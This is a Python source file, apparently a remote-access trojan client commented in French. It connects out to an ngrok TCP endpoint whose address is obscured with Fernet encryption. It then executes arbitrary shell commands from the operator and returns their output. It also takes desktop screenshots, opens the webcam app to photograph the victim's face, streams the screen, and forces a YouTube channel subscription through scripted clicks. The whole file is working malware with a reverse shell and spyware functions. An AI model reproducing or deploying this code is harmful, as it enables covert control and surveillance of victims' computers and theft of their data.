import socket, os, subprocess
import sys
import time
import webbrowser
import threading
import pyautogui
from mss import mss
from pyautogui import write
from pyautogui import click
from time import sleep
from vidstream import ScreenShareClient
from cryptography.fernet import Fernet
import base64


def screenshot():
    with mss() as sct:
        sct.shot(output="screen.png")

def screenface():
    with mss() as sct:
        sct.shot(output="screenface.png")

t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



#chiffrer le host et le port
key1 = Fernet.generate_key()
crypt = Fernet(key1)
code = crypt.encrypt(b"6.tcp.ngrok.io")
code2 = crypt.encrypt(b"14250")
decode = crypt.decrypt(code)
decode2 = crypt.decrypt(code2)
#fin du chiffrage
host = str(decode, "utf8")
port = int(decode2)
#fin du chiffrage
t.connect((host, port))

while True:
    commande = t.recv(1024).decode("utf-8")

    #pour quitter le serveur
    if commande == "goodbye":
        t.send(b'close')
        t.close()
        break

    #pour démarrer googles

    elif commande == "start_google":
        #chiffrement du lien google
        code3 = crypt.encrypt(b"Chrome.exe")
        decode3 = crypt.decrypt(code3)
        a = str(decode3, "utf8")
        webbrowser.open(a)

    #pour envoyer un message
    elif commande == "send_salut_cmd":
        os.system(f"echo salut")

    #pour eenvoyer des messages
    elif commande =="send_msg":
        while True:
            code5 = crypt.encrypt(b"cmd.exe")
            decode5 = crypt.decrypt(code5)
            commandetest = str(decode5, "utf8")
            subprocess.Popen("cmd.exe")
            time.sleep(3)
            pyautogui.write(f" echo {commande}")
            time.sleep(3)
            pyautogui.press("enter")


    #pour s'aboonner à ma chaine
    elif commande == "subscribe":
        code4 = crypt.encrypt(b"C:\Program Files (x86)\Google\Chrome\Application\Chrome.exe")
        decode4 = crypt.decrypt(code4)
        youtubesub = str(decode4, "utf8")
        url = "https://www.youtube.com/channel/UC5Z25OKt9neROPajmNoteZg/?sub_confirmation=1"
        webbrowser.register("chrome", None, webbrowser.BackgroundBrowser(youtubesub), 1)
        webbrowser.get("chrome").open_new_tab(url)
        sleep(4)
        click(1116, 608)

    #pour lancer un live stream
    elif commande == "stream":
        sender = ScreenShareClient(host, port)
        t = threading.Thread(target=sender.start_stream)
        t.start()

        while input() != 'stop':
            continue

        sender.stop_stream()

    #pour prendre un screen de la personne
    elif commande =="take_facepicture":
        subprocess.run('start microsoft.windows.camera:', shell=True)
        time.sleep(5)
        screenface()
        len_img = str(os.path.getsize("screenface.png"))
        t.send(len_img.encode("utf-8"))
        with open("screenface.png", "rb") as img:
            t.send(img.read())

    #pour le commander
    elif commande =="start_commander":
        while True:
            if commande =="cd":
                result = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE)
                t.send(result.stdout.read())

            elif commande[:2] == "cd":
                if os.path.exists(str(commande[3:].replace("\n", ""))):
                    os.chdir(str(commande[3:].replace("\n", "")))
                    t.send(os.popen("cd").read().encode("utf-8"))

            elif commande == "stop":
                break

    #pour une screen du bureau
    elif commande == "screenshot":
        screenshot()
        len_img = str(os.path.getsize("screen.png"))
        t.send(len_img.encode("utf-8"))
        with open("screen.png", "rb") as img:
            t.send(img.read())
    #pareil commande cd
    elif commande =="cd":
        result = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE)
        t.send(result.stdout.read())

    elif commande[:2] == "cd":
        if os.path.exists(str(commande[3:].replace("\n", ""))):
            os.chdir(str(commande[3:].replace("\n", "")))
            t.send(os.popen("cd").read().encode("utf-8"))

    else:
        r = subprocess.Popen(commande, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = r.communicate()

        if result[1]:
            t.send(result[1])

        else:
            t.send(result[0])